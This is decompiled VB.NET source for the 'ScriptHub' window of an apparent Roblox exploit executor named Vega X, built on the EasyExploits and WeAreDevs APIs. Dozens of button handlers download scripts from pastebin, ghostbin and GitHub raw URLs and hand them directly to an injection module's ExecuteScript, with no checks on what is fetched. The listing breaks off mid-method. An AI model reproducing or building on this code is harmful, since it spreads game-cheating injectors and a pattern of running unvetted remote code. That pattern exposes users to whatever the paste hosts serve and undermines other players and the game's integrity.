Imports System
Imports System.ComponentModel
Imports System.Drawing
Imports System.Net
Imports System.Windows.Forms
Imports EasyExploits
Imports WeAreDevs_API

Namespace Vega_X
	' Token: 0x02000009 RID: 9
	Public Partial Class ScriptHub
		Inherits Form

		' Token: 0x06000068 RID: 104 RVA: 0x000023F9 File Offset: 0x000005F9
		Public Sub New()
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000069 RID: 105 RVA: 0x0000208E File Offset: 0x0000028E
		Private Sub button2_Click(sender As Object, e As EventArgs)
			MyBase.WindowState = FormWindowState.Minimized
		End Sub

		' Token: 0x0600006A RID: 106 RVA: 0x00002084 File Offset: 0x00000284
		Private Sub label1_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x0600006B RID: 107 RVA: 0x00007124 File Offset: 0x00005324
		Private Sub label1_MouseMove(sender As Object, e As MouseEventArgs)
			If e.Button = MouseButtons.Left Then
				MyBase.Left += e.X - Me.lastPoint.X
				MyBase.Top += e.Y - Me.lastPoint.Y
			End If
		End Sub

		' Token: 0x0600006C RID: 108 RVA: 0x00002424 File Offset: 0x00000624
		Private Sub label1_MouseDown(sender As Object, e As MouseEventArgs)
			Me.lastPoint = New Point(e.X, e.Y)
		End Sub

		' Token: 0x0600006D RID: 109 RVA: 0x00007124 File Offset: 0x00005324
		Private Sub panel1_MouseMove(sender As Object, e As MouseEventArgs)
			If e.Button = MouseButtons.Left Then
				MyBase.Left += e.X - Me.lastPoint.X
				MyBase.Top += e.Y - Me.lastPoint.Y
			End If
		End Sub

		' Token: 0x0600006E RID: 110 RVA: 0x00002424 File Offset: 0x00000624
		Private Sub panel1_MouseDown(sender As Object, e As MouseEventArgs)
			Me.lastPoint = New Point(e.X, e.Y)
		End Sub

		' Token: 0x0600006F RID: 111 RVA: 0x00002084 File Offset: 0x00000284
		Private Sub button4_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000070 RID: 112 RVA: 0x00002086 File Offset: 0x00000286
		Private Sub button1_Click_1(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x06000071 RID: 113 RVA: 0x00002097 File Offset: 0x00000297
		Private Sub ScriptHub_Load_1(sender As Object, e As EventArgs)
			MyBase.TopMost = True
		End Sub

		' Token: 0x06000072 RID: 114 RVA: 0x00007180 File Offset: 0x00005380
		Private Sub button10_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/nmQp3H5S")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000073 RID: 115 RVA: 0x000071AC File Offset: 0x000053AC
		Private Sub button11_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/AA1sEPj9")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000074 RID: 116 RVA: 0x000071D8 File Offset: 0x000053D8
		Private Sub button17_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/hzhXZCDp")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000075 RID: 117 RVA: 0x00007204 File Offset: 0x00005404
		Private Sub button5_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000076 RID: 118 RVA: 0x00007230 File Offset: 0x00005430
		Private Sub button15_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/WsTFs9cM")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000077 RID: 119 RVA: 0x0000725C File Offset: 0x0000545C
		Private Sub button18_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/inTV4qEb")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000078 RID: 120 RVA: 0x00007288 File Offset: 0x00005488
		Private Sub button13_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/QaNEaCWQ")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000079 RID: 121 RVA: 0x000072B4 File Offset: 0x000054B4
		Private Sub button9_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/gCqHzmxK")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600007A RID: 122 RVA: 0x000072E0 File Offset: 0x000054E0
		Private Sub button7_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/7xEvhGPt")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600007B RID: 123 RVA: 0x0000730C File Offset: 0x0000550C
		Private Sub button16_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/XRQZ9TRD")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600007C RID: 124 RVA: 0x00007338 File Offset: 0x00005538
		Private Sub button12_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/wwQRd376")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600007D RID: 125 RVA: 0x00007364 File Offset: 0x00005564
		Private Sub button8_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/E4xJyXVT")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600007E RID: 126 RVA: 0x00007390 File Offset: 0x00005590
		Private Sub button14_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/4Jb97VWF")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600007F RID: 127 RVA: 0x000073BC File Offset: 0x000055BC
		Private Sub button4_Click_1(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/7LHqgGR7")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000080 RID: 128 RVA: 0x000073E8 File Offset: 0x000055E8
		Private Sub button3_Click_1(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/2j26Z6hT")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000081 RID: 129 RVA: 0x00007414 File Offset: 0x00005614
		Private Sub button6_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/RaV9yQPB")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000082 RID: 130 RVA: 0x00002084 File Offset: 0x00000284
		Private Sub panel2_Paint(sender As Object, e As PaintEventArgs)
		End Sub

		' Token: 0x06000083 RID: 131 RVA: 0x00007440 File Offset: 0x00005640
		Private Sub button20_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/fub69UPC")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000084 RID: 132 RVA: 0x0000746C File Offset: 0x0000566C
		Private Sub button19_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/jGSADZUs")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000085 RID: 133 RVA: 0x00007498 File Offset: 0x00005698
		Private Sub button22_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/wLEJ6YDF")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000086 RID: 134 RVA: 0x000074C4 File Offset: 0x000056C4
		Private Sub button23_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/ubsmRJ0N")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000087 RID: 135 RVA: 0x000074F0 File Offset: 0x000056F0
		Private Sub button24_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/HLVSNhG5")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000088 RID: 136 RVA: 0x0000751C File Offset: 0x0000571C
		Private Sub button21_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/WBux8Zti")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000089 RID: 137 RVA: 0x00007548 File Offset: 0x00005748
		Private Sub button28_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/uJFSy4UM")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600008A RID: 138 RVA: 0x00007574 File Offset: 0x00005774
		Private Sub button30_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/stN7rtkS")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600008B RID: 139 RVA: 0x000075A0 File Offset: 0x000057A0
		Private Sub button31_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/h2sR0jjk")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600008C RID: 140 RVA: 0x000075CC File Offset: 0x000057CC
		Private Sub button35_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/9kRGN3s6")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600008D RID: 141 RVA: 0x000075F8 File Offset: 0x000057F8
		Private Sub button33_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/dhx6PWjs")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600008E RID: 142 RVA: 0x00007624 File Offset: 0x00005824
		Private Sub button32_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/LF6kGu3c")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600008F RID: 143 RVA: 0x00007650 File Offset: 0x00005850
		Private Sub button29_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/npWW17Vh")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000090 RID: 144 RVA: 0x0000767C File Offset: 0x0000587C
		Private Sub button34_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/v3UnMKzs")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000091 RID: 145 RVA: 0x000076A8 File Offset: 0x000058A8
		Private Sub button27_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/0JxYan63")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000092 RID: 146 RVA: 0x000076D4 File Offset: 0x000058D4
		Private Sub button26_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/rD5LM6wa")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000093 RID: 147 RVA: 0x00007700 File Offset: 0x00005900
		Private Sub button25_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/Xvh0r8Y4")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000094 RID: 148 RVA: 0x0000772C File Offset: 0x0000592C
		Private Sub button39_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/qSU9Af6K")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000095 RID: 149 RVA: 0x00002084 File Offset: 0x00000284
		Private Sub label5_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000096 RID: 150 RVA: 0x00007758 File Offset: 0x00005958
		Private Sub button40_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/8v5ke3rj")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000097 RID: 151 RVA: 0x00007784 File Offset: 0x00005984
		Private Sub button39_Click_1(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/3mi7Q7ZN")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000098 RID: 152 RVA: 0x000077B0 File Offset: 0x000059B0
		Private Sub button38_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/PLpP0hv4")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x06000099 RID: 153 RVA: 0x00007180 File Offset: 0x00005380
		Private Sub button36_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/nmQp3H5S")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600009A RID: 154 RVA: 0x000077DC File Offset: 0x000059DC
		Private Sub button37_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/cGvhHsmj")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600009B RID: 155 RVA: 0x00007808 File Offset: 0x00005A08
		Private Sub button41_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/hxiq7ete")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600009C RID: 156 RVA: 0x00007834 File Offset: 0x00005A34
		Private Sub button43_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/SsG8y3HA")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600009D RID: 157 RVA: 0x00007860 File Offset: 0x00005A60
		Private Sub button42_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/4APXHsG4")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600009E RID: 158 RVA: 0x0000788C File Offset: 0x00005A8C
		Private Sub button44_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/AcfRR2rY")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x0600009F RID: 159 RVA: 0x000078B8 File Offset: 0x00005AB8
		Private Sub button45_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/Fi6DhyZ5")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000A0 RID: 160 RVA: 0x000078E4 File Offset: 0x00005AE4
		Private Sub button47_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/50Fx94Mf")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000A1 RID: 161 RVA: 0x00007910 File Offset: 0x00005B10
		Private Sub button48_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/ZTwaS4r6")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000A2 RID: 162 RVA: 0x0000793C File Offset: 0x00005B3C
		Private Sub button46_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/SXTsH1ep")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000A3 RID: 163 RVA: 0x00007180 File Offset: 0x00005380
		Private Sub button49_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/nmQp3H5S")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000A4 RID: 164 RVA: 0x00007968 File Offset: 0x00005B68
		Private Sub button50_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/ACaMSi5E")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000A5 RID: 165 RVA: 0x00007994 File Offset: 0x00005B94
		Private Sub button38_Click_1(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/jDimL2uE")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000A6 RID: 166 RVA: 0x000079C0 File Offset: 0x00005BC0
		Private Sub button58_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/mmSYPxWr")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000A7 RID: 167 RVA: 0x00007180 File Offset: 0x00005380
		Private Sub button59_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/nmQp3H5S")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000A8 RID: 168 RVA: 0x000079EC File Offset: 0x00005BEC
		Private Sub button60_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/eLu8bfa9")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000A9 RID: 169 RVA: 0x00007A18 File Offset: 0x00005C18
		Private Sub button61_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/RwQJ9Hf6")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000AA RID: 170 RVA: 0x00007A44 File Offset: 0x00005C44
		Private Sub button62_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/xXa7KEm9")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000AB RID: 171 RVA: 0x00007A70 File Offset: 0x00005C70
		Private Sub button56_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/YdW7Qr4v")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000AC RID: 172 RVA: 0x00007180 File Offset: 0x00005380
		Private Sub button55_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/nmQp3H5S")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000AD RID: 173 RVA: 0x00007A9C File Offset: 0x00005C9C
		Private Sub button51_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/sTTPWcPh")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000AE RID: 174 RVA: 0x00007AC8 File Offset: 0x00005CC8
		Private Sub button57_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/7Dvxr2WN")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000AF RID: 175 RVA: 0x00007AF4 File Offset: 0x00005CF4
		Private Sub button54_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/1EfYc1Ji")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000B0 RID: 176 RVA: 0x00007B20 File Offset: 0x00005D20
		Private Sub button52_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/uXxLXsVb")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000B1 RID: 177 RVA: 0x00007B4C File Offset: 0x00005D4C
		Private Sub button53_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/ynGZffAv")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000B2 RID: 178 RVA: 0x00002086 File Offset: 0x00000286
		Private Sub button1_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x060000B3 RID: 179 RVA: 0x00007B78 File Offset: 0x00005D78
		Private Sub button67_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/kz1Et0kG")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000B4 RID: 180 RVA: 0x00007180 File Offset: 0x00005380
		Private Sub button66_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/nmQp3H5S")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000B5 RID: 181 RVA: 0x00007BA4 File Offset: 0x00005DA4
		Private Sub button65_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/LAMKLyMb")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000B6 RID: 182 RVA: 0x00007BD0 File Offset: 0x00005DD0
		Private Sub button64_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/sT56AM8k")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000B7 RID: 183 RVA: 0x00007BFC File Offset: 0x00005DFC
		Private Sub button63_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/PkstS6Mr")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000B8 RID: 184 RVA: 0x00007C28 File Offset: 0x00005E28
		Private Sub button72_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://ghostbin.co/paste/y8rb4/raw")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000B9 RID: 185 RVA: 0x00007C54 File Offset: 0x00005E54
		Private Sub button71_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/NwHZw2Tg")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000BA RID: 186 RVA: 0x00007C80 File Offset: 0x00005E80
		Private Sub button70_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/jaVGYcQQ")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000BB RID: 187 RVA: 0x00007CAC File Offset: 0x00005EAC
		Private Sub button69_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/WchTMzDB")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000BC RID: 188 RVA: 0x00007CD8 File Offset: 0x00005ED8
		Private Sub button68_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/m7vj2Fvr")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000BD RID: 189 RVA: 0x00007D04 File Offset: 0x00005F04
		Private Sub button73_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/afLQ5vDy")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000BE RID: 190 RVA: 0x00007D30 File Offset: 0x00005F30
		Private Sub button77_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/zP2c3Nqv")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000BF RID: 191 RVA: 0x00007D5C File Offset: 0x00005F5C
		Private Sub button74_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/rKCUB2g1")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000C0 RID: 192 RVA: 0x00007D88 File Offset: 0x00005F88
		Private Sub button76_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/C8bmZnQ4")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000C1 RID: 193 RVA: 0x00007DB4 File Offset: 0x00005FB4
		Private Sub button75_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://raw.githubusercontent.com/JoshieGemFinder/gubgub/main/beeswaemfree")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000C2 RID: 194 RVA: 0x00007DE0 File Offset: 0x00005FE0
		Private Sub button81_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/F17Xe560")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000C3 RID: 195 RVA: 0x00007180 File Offset: 0x00005380
		Private Sub button80_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/nmQp3H5S")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000C4 RID: 196 RVA: 0x00007E0C File Offset: 0x0000600C
		Private Sub button79_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/ftzpeQYz")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000C5 RID: 197 RVA: 0x00007E38 File Offset: 0x00006038
		Private Sub button78_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/pzvMtyyT")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000C6 RID: 198 RVA: 0x00007E64 File Offset: 0x00006064
		Private Sub button83_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/QEzQyxDT")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000C7 RID: 199 RVA: 0x00007E90 File Offset: 0x00006090
		Private Sub button86_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/uLe9rWfY")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000C8 RID: 200 RVA: 0x00007EBC File Offset: 0x000060BC
		Private Sub button85_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/Zt9FHBz7")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000C9 RID: 201 RVA: 0x00007EE8 File Offset: 0x000060E8
		Private Sub button84_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/nLwctUaw")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000CA RID: 202 RVA: 0x00007F14 File Offset: 0x00006114
		Private Sub button87_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/g5Gz29Dr")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000CB RID: 203 RVA: 0x00007F40 File Offset: 0x00006140
		Private Sub button82_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/GPd6QyAf")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000CC RID: 204 RVA: 0x00007F6C File Offset: 0x0000616C
		Private Sub button100_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/GwG7JhqH")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000CD RID: 205 RVA: 0x00007F98 File Offset: 0x00006198
